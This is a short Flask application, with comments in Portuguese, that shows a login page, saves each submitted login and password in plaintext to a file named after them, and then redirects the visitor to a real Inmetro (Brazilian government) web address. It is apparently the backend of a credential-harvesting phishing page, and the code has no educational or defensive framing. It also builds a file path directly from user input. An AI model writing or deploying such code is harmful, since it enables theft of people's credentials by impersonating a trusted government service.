from flask import Flask, render_template, request, redirect
import os

app = Flask(__name__)

@app.route('/')
def index():
  return render_template('index.html')

@app.route('/', methods=['POST'])
def login():
    login = request.form['Login']
    senha = request.form['Password']

    # Gerar o caminho completo para o arquivo de texto
    filename = os.path.join(app.root_path, f'dados_{login}{senha}.txt')

    # Escrever as informações de login e senha no arquivo de texto
    with open(filename, 'w') as file:
        file.write(f'Login: {login}\nSenha: {senha}\n')

    # Exibir mensagem de log
    app.logger.info('Login e senha enviados com sucesso!')

    # Redirecionar para um site após salvar o arquivo
    return redirect('https://orquestra.inmetro.gov.br/inmetrobcweb/')

if __name__ == '__main__':
  app.run(port=5000)
